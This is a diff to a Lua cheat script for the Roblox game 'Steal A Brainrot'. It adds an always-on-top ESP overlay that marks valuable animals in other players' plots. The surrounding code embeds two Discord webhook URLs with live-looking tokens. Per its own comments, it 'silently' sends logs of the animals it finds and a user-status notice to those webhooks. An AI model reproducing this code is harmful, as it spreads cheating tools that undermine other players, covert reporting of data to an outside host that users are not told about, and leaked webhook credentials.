@@ -1,5 +1,5 @@
 -- ================================
--- Scripts Hub X | Official (Fixed Version)
+-- Scripts Hub X | Official (Fixed Version) + ESP Enhancement
 -- ================================
 
 -- Services
@@ -100,6 +100,10 @@ end
 -- Tracked animals to prevent spam
 local loggedAnimals = {}
 
+-- ESP Storage
+local espObjects = {}
+local espEnabled = true
+
 -- UserIds
 local OwnerUserId = "2341777244"
 local PremiumUsers = {
@@ -128,6 +132,184 @@ local BlacklistUsers = {
 local webhookUrl = "https://discord.com/api/webhooks/1416367485803827230/4OLebMf0rtkCajS5S5lmo99iXe0v6v5B1gn_lPDAzz_MQtj0-HabA9wa2PF-5QBNUmgi"
 local webhookUrll = "https://discord.com/api/webhooks/1403702581104218153/k_yKYW6971_qADkSO6iuOjj7AIaXIfQuVcIs0mZIpNWJAc_cORIf0ieSDBlN8zibbHi-"
 
+-- ================================
+-- ESP FUNCTIONS
+-- ================================
+
+-- Create ESP for a single object
+local function createESP(object, animalName)
+    if not object or not object.Parent then return end
+    
+    local espId = tostring(object) .. "_" .. animalName
+    
+    -- Prevent duplicate ESP
+    if espObjects[espId] then return end
+    
+    -- Create ESP container
+    local espContainer = {}
+    
+    -- Function to create highlight effect
+    local function createHighlight()
+        local highlight = Instance.new("Highlight")
+        highlight.Parent = object
+        highlight.FillColor = Color3.new(0, 0.5, 1) -- Blue color
+        highlight.OutlineColor = Color3.new(0, 0.8, 1) -- Brighter blue
+        highlight.FillTransparency = 0.7
+        highlight.OutlineTransparency = 0
+        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+        return highlight
+    end
+    
+    -- Function to create name label
+    local function createNameLabel()
+        local billboardGui = Instance.new("BillboardGui")
+        billboardGui.Parent = object
+        billboardGui.Size = UDim2.new(0, 200, 0, 50)
+        billboardGui.StudsOffset = Vector3.new(0, 5, 0)
+        billboardGui.AlwaysOnTop = true
+        
+        local nameLabel = Instance.new("TextLabel")
+        nameLabel.Parent = billboardGui
+        nameLabel.Size = UDim2.new(1, 0, 1, 0)
+        nameLabel.BackgroundTransparency = 1
+        nameLabel.Text = animalName
+        nameLabel.TextColor3 = Color3.new(0, 0.8, 1) -- Bright blue
+        nameLabel.TextStrokeTransparency = 0
+        nameLabel.TextStrokeColor3 = Color3.new(0, 0, 0) -- Black outline
+        nameLabel.TextScaled = true
+        nameLabel.Font = Enum.Font.GothamBold
+        
+        -- Add neon effect
+        local textStroke = Instance.new("UIStroke")
+        textStroke.Parent = nameLabel
+        textStroke.Color = Color3.new(0, 0.6, 1)
+        textStroke.Thickness = 2
+        textStroke.Transparency = 0.3
+        
+        return billboardGui
+    end
+    
+    -- Function to create selection box (additional outline)
+    local function createSelectionBox()
+        local selectionBox = Instance.new("SelectionBox")
+        selectionBox.Parent = object
+        selectionBox.Adornee = object
+        selectionBox.Color3 = Color3.new(0, 0.8, 1) -- Bright blue
+        selectionBox.LineThickness = 0.2
+        selectionBox.Transparency = 0.2
+        return selectionBox
+    end
+    
+    -- Create all ESP components
+    local highlight = createHighlight()
+    local nameLabel = createNameLabel()
+    local selectionBox = createSelectionBox()
+    
+    -- Store ESP components
+    espContainer.highlight = highlight
+    espContainer.nameLabel = nameLabel
+    espContainer.selectionBox = selectionBox
+    espContainer.object = object
+    
+    espObjects[espId] = espContainer
+    
+    -- Clean up if object is destroyed
+    object.AncestryChanged:Connect(function()
+        if not object.Parent then
+            if espObjects[espId] then
+                if espObjects[espId].highlight then
+                    espObjects[espId].highlight:Destroy()
+                end
+                if espObjects[espId].nameLabel then
+                    espObjects[espId].nameLabel:Destroy()
+                end
+                if espObjects[espId].selectionBox then
+                    espObjects[espId].selectionBox:Destroy()
+                end
+                espObjects[espId] = nil
+            end
+        end
+    end)
+end
+
+-- Remove ESP from an object
+local function removeESP(object, animalName)
+    local espId = tostring(object) .. "_" .. animalName
+    if espObjects[espId] then
+        if espObjects[espId].highlight then
+            espObjects[espId].highlight:Destroy()
+        end
+        if espObjects[espId].nameLabel then
+            espObjects[espId].nameLabel:Destroy()
+        end
+        if espObjects[espId].selectionBox then
+            espObjects[espId].selectionBox:Destroy()
+        end
+        espObjects[espId] = nil
+    end
+end
+
+-- Apply ESP to all currently detected brainrots
+local function applyESPToExistingAnimals()
+    if not espEnabled then return end
+    
+    -- ESP for plot animals
+    local plots = workspace:FindFirstChild("Plots")
+    if plots then
+        for _, plot in pairs(plots:GetChildren()) do
+            if plot:IsA("Model") then
+                for _, child in pairs(plot:GetChildren()) do
+                    if child:IsA("Model") and espTargetLookup[child.Name] then
+                        createESP(child, child.Name)
+                    end
+                end
+            end
+        end
+    end
+    
+    -- ESP for rendered moving animals
+    local renderedAnimals = workspace:FindFirstChild("RenderedMovingAnimals")
+    if renderedAnimals then
+        for _, child in pairs(renderedAnimals:GetChildren()) do
+            if child:IsA("Model") and espTargetLookup[child.Name] then
+                createESP(child, child.Name)
+            end
+        end
+    end
+end
+
+-- Clear all ESP
+local function clearAllESP()
+    for espId, espContainer in pairs(espObjects) do
+        if espContainer.highlight then
+            espContainer.highlight:Destroy()
+        end
+        if espContainer.nameLabel then
+            espContainer.nameLabel:Destroy()
+        end
+        if espContainer.selectionBox then
+            espContainer.selectionBox:Destroy()
+        end
+    end
+    espObjects = {}
+end
+
+-- Toggle ESP on/off
+local function toggleESP()
+    espEnabled = not espEnabled
+    if espEnabled then
+        applyESPToExistingAnimals()
+        notify("ESP", "Brainrot ESP Enabled")
+    else
+        clearAllESP()
+        notify("ESP", "Brainrot ESP Disabled")
+    end
+end
+
+-- ================================
+-- ORIGINAL FUNCTIONS (MODIFIED)
+-- ================================
+
 -- Animal Logger Functions
 local function scanPlotsForAnimals()
     local plots = workspace:FindFirstChild("Plots")
@@ -152,9 +334,15 @@ local function scanPlotsForAnimals()
                         table.insert(foundAnimals, {
                             plotName = plotName,
                             animalName = child.Name,
-                            animalId = animalId
+                            animalId = animalId,
+                            object = child -- Store reference for ESP
                         })
                         loggedAnimals[animalId] = true
+                        
+                        -- Apply ESP immediately when found
+                        if espEnabled then
+                            createESP(child, child.Name)
+                        end
                     end
                 end
             end
@@ -182,9 +370,15 @@ local function scanRenderedMovingAnimals()
                 table.insert(foundAnimals, {
                     plotName = "RenderedMovingAnimals",
                     animalName = child.Name,
-                    animalId = animalId
+                    animalId = animalId,
+                    object = child -- Store reference for ESP
                 })
                 loggedAnimals[animalId] = true
+                
+                -- Apply ESP immediately when found
+                if espEnabled then
+                    createESP(child, child.Name)
+                end
             end
         end
     end
@@ -272,6 +466,9 @@ local function checkForAnimals()
     -- Send to webhook if animals found (silently)
     if #allAnimals > 0 then
         sendAnimalLog(allAnimals)
+        
+        -- Show notification about ESP activation
+        notify("Brainrot Detected", #allAnimals .. " brainrot(s) found and ESP applied!")
     end
 end
 
@@ -607,39 +804,81 @@ local function checkUserStatus()
 	return "regular"
 end
 
--- Initialize Animal Logger for Steal A Brainrot
+-- Initialize Animal Logger for Steal A Brainrot (ENHANCED WITH ESP)
 local function initializeAnimalLogger()
 	if game.PlaceId == STEAL_A_BRAINROT_ID then
+		print("🎯 Initializing Brainrot ESP System...")
+		
 		-- Initial scan after delay
 		task.spawn(function()
 			task.wait(5) -- Wait for game to fully load
 			checkForAnimals()
+			applyESPToExistingAnimals() -- Apply ESP to any existing animals
 		end)
 		
-		-- Monitor for new animals being added
+		-- Monitor for new animals being added to Plots
 		workspace.DescendantAdded:Connect(function(descendant)
-			if descendant:IsA("Model") and espTargetLookup[descendant.Name] then
-				task.wait(2) -- Small delay to ensure the animal is fully loaded
-				checkForAnimals()
+			if descendant:IsA("Model") and descendant.Parent and espTargetLookup[descendant.Name] then
+				-- Check if it's in a plot
+				local parent = descendant.Parent
+				if parent and parent.Parent == workspace:FindFirstChild("Plots") then
+					task.wait(2) -- Small delay to ensure the animal is fully loaded
+					checkForAnimals()
+				end
 			end
 		end)
 		
-		-- Periodic scan every 5 seconds to catch any missed animals
+		-- Monitor for new animals in RenderedMovingAnimals
+		local renderedAnimals = workspace:FindFirstChild("RenderedMovingAnimals")
+		if renderedAnimals then
+			renderedAnimals.ChildAdded:Connect(function(child)
+				if child:IsA("Model") and espTargetLookup[child.Name] then
+					task.wait(1)
+					checkForAnimals()
+				end
+			end)
+		end
+		
+		-- Watch for RenderedMovingAnimals folder being created
+		workspace.ChildAdded:Connect(function(child)
+			if child.Name == "RenderedMovingAnimals" then
+				child.ChildAdded:Connect(function(animal)
+					if animal:IsA("Model") and espTargetLookup[animal.Name] then
+						task.wait(1)
+						checkForAnimals()
+					end
+				end)
+			end
+		end)
+		
+		-- Periodic scan every 10 seconds to catch any missed animals
 		task.spawn(function()
 			while true do
-				task.wait(5)
+				task.wait(10)
 				checkForAnimals()
 			end
 		end)
+		
+		-- Add keybind to toggle ESP (F key)
+		local UserInputService = game:GetService("UserInputService")
+		UserInputService.InputBegan:Connect(function(input, gameProcessed)
+			if gameProcessed then return end
+			
+			if input.KeyCode == Enum.KeyCode.F then
+				toggleESP()
+			end
+		end)
+		
+		notify("ESP System", "Brainrot ESP initialized! Press F to toggle ESP.")
 	end
 end
 
 -- ================================
--- MAIN EXECUTION (SIMPLIFIED)
+-- MAIN EXECUTION (ENHANCED)
 -- ================================
 
 spawn(function()
-	print("🚀 Starting Scripts Hub X...")
+	print("🚀 Starting Scripts Hub X with ESP Enhancement...")
 	
 	-- Check user status
 	local userStatus = checkUserStatus()
@@ -656,13 +895,13 @@ spawn(function()
 	-- Send webhook notification
 	sendWebhookNotification(userStatus, scriptUrl or "No script URL")
 	
-	-- Initialize Animal Logger (silently)
+	-- Initialize Animal Logger with ESP (silently)
 	initializeAnimalLogger()
 	
 	-- Handle unsupported games
 	if not isSupported then
 		print("❌ Game not supported")
-		showError("Game is not supported. Suggest this game on our Discord server.")
+		showError("Game is not supported")
 		return
 	end
 	
@@ -672,7 +911,6 @@ spawn(function()
 	
 	if success then
 		print("✅ Scripts Hub X | Complete for " .. userStatus .. " user")
-		notify("Scripts Hub X", "Script loaded successfully!")
 	else
 		print("❌ Script failed to load: " .. tostring(errorMsg))
 	end
